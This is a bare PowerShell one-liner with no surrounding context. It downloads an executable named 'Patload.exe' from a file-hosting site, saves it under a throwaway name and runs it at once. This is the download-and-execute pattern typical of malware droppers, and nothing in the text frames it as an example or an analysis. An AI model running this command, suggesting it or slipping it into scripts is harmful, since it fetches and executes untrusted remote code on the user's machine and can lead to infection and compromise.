
(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'

